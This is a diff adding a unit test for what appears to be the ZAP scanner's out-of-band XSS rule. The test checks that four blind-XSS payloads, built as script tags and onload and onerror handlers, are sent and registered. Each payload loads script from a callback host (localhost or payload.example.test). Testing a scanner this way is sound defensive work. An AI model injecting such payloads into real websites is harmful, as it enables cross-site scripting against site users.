@@ -19,21 +19,121 @@
  */
 package org.zaproxy.zap.extension.ascanrulesBeta;
 
+import static fi.iki.elonen.NanoHTTPD.newFixedLengthResponse;
 import static org.hamcrest.MatcherAssert.assertThat;
+import static org.hamcrest.Matchers.contains;
 import static org.hamcrest.Matchers.equalTo;
+import static org.hamcrest.Matchers.hasSize;
 import static org.hamcrest.Matchers.is;
+import static org.junit.jupiter.api.Assertions.assertAll;
+import static org.mockito.ArgumentMatchers.any;
+import static org.mockito.ArgumentMatchers.eq;
+import static org.mockito.Mockito.mock;
+import static org.mockito.Mockito.times;
+import static org.mockito.Mockito.verify;
+import static org.mockito.Mockito.when;
 
+import fi.iki.elonen.NanoHTTPD;
+import java.util.ArrayList;
+import java.util.List;
 import java.util.Map;
 import org.junit.jupiter.api.Test;
+import org.junit.jupiter.params.ParameterizedTest;
+import org.junit.jupiter.params.provider.ValueSource;
+import org.mockito.ArgumentCaptor;
+import org.parosproxy.paros.control.Control;
+import org.parosproxy.paros.core.scanner.Alert;
+import org.parosproxy.paros.extension.ExtensionLoader;
+import org.parosproxy.paros.model.Model;
+import org.parosproxy.paros.network.HttpMessage;
 import org.zaproxy.addon.commonlib.CommonAlertTag;
 import org.zaproxy.addon.commonlib.PolicyTag;
 import org.zaproxy.addon.oast.ExtensionOast;
+import org.zaproxy.addon.oast.OastService;
+import org.zaproxy.addon.oast.services.callback.CallbackService;
+import org.zaproxy.zap.testutils.NanoServerHandler;
 
 class OutOfBandXssScanRuleUnitTest extends ActiveScannerTest<OutOfBandXssScanRule> {
 
     @Override
     protected OutOfBandXssScanRule createScanner() {
         return new OutOfBandXssScanRule();
+    }
+
+    @ParameterizedTest
+    @ValueSource(booleans = {true, false})
+    void shouldSendPayloadsWithCallbackUrlAndJavaScriptQuotes(boolean callbackService)
+            throws Exception {
+        // Given
+        nano.addHandler(
+                new NanoServerHandler("/blind") {
+                    @Override
+                    protected NanoHTTPD.Response serve(NanoHTTPD.IHTTPSession session) {
+                        return newFixedLengthResponse("No callback reflected");
+                    }
+                });
+        ExtensionOast extensionOast = mock(ExtensionOast.class);
+        Control.initSingletonForTesting(Model.getSingleton(), mock(ExtensionLoader.class));
+        when(Control.getSingleton().getExtensionLoader().getExtension(ExtensionOast.class))
+                .thenReturn(extensionOast);
+        String callbackUrl;
+        if (callbackService) {
+            callbackUrl = "http://localhost:1234/callback";
+            when(extensionOast.getCallbackService()).thenReturn(mock(CallbackService.class));
+            when(extensionOast.registerAlertAndGetPayloadForCallbackService(
+                            any(), eq(OutOfBandXssScanRule.class.getSimpleName())))
+                    .thenReturn(callbackUrl);
+        } else {
+            callbackUrl = "https://payload.example.test";
+            when(extensionOast.getActiveScanOastService()).thenReturn(mock(OastService.class));
+            when(extensionOast.registerAlertAndGetPayload(any()))
+                    .thenReturn("payload.example.test");
+        }
+        HttpMessage message = getHttpMessage("/blind?value=original");
+        rule.init(message, parent);
+        List<String> expectedAttacks =
+                List.of(
+                        "<script src=\"" + callbackUrl + "\"></script>",
+                        "</script><script src=\"" + callbackUrl + "\">",
+                        "\" onload=\"var s=document.createElement('script');s.src='"
+                                + callbackUrl
+                                + "';document.getElementsByTagName('head')[0].appendChild(s);\" garbage=\"",
+                        "'\"><img src=x onerror=\"var s=document.createElement('script');s.src='"
+                                + callbackUrl
+                                + "';document.getElementsByTagName('head')[0].appendChild(s);\">\n");
+
+        // When
+        rule.scan();
+
+        // Then
+        ArgumentCaptor<Alert> registeredAlerts = ArgumentCaptor.forClass(Alert.class);
+        if (callbackService) {
+            verify(extensionOast, times(4))
+                    .registerAlertAndGetPayloadForCallbackService(
+                            registeredAlerts.capture(),
+                            eq(OutOfBandXssScanRule.class.getSimpleName()));
+        } else {
+            verify(extensionOast, times(4)).registerAlertAndGetPayload(registeredAlerts.capture());
+        }
+        List<String> sentQueries = new ArrayList<>();
+        for (HttpMessage sent : httpMessagesSent) {
+            sentQueries.add(sent.getRequestHeader().getURI().getQuery());
+        }
+        assertAll(
+                () ->
+                        assertThat(
+                                sentQueries,
+                                contains(
+                                        expectedAttacks.stream()
+                                                .map(attack -> "value=" + attack)
+                                                .toArray(String[]::new))),
+                () ->
+                        assertThat(
+                                registeredAlerts.getAllValues().stream()
+                                        .map(Alert::getAttack)
+                                        .toList(),
+                                contains(expectedAttacks.toArray(String[]::new))),
+                () -> assertThat(alertsRaised, hasSize(0)));
     }
 
     @Test
